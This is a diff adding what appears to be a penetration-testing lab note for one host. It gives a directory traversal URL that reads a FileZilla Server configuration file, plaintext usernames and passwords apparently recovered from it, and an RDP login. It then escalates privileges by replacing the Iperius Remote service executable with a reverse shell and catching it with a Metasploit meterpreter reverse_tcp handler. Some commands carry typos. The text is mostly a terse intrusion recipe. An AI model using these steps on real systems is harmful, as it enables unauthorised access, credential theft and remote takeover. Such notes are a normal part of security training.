@@ -1,0 +1,23 @@
+PHP Power Browse 1.2 - Directory Traversal - https://www.exploit-db.com/exploits/40204
+
+http://10.2.2.86/browse.php?p=source&file=C:\Program%20Files\FileZilla%20Server\FileZilla%20Server.xml
+
+administrator:123456
+john:easyas123
+
+login rdp as john
+
+Iperius Remote 1.7.0 - https://www.exploit-db.com/exploits/40427
+
+sc qc IperiusRemotesvc
+
+replace the executable with reverse shell as IperiusRemote.exe
+ 
+use exploit/multi/hnadler
+set payload windows/meterpreter/reverse_tcp
+set lhost IP
+setlport PORT
+set AUTORUNSCRIPT post/windows/manage/migrate 
+run
+
+reboot and wait
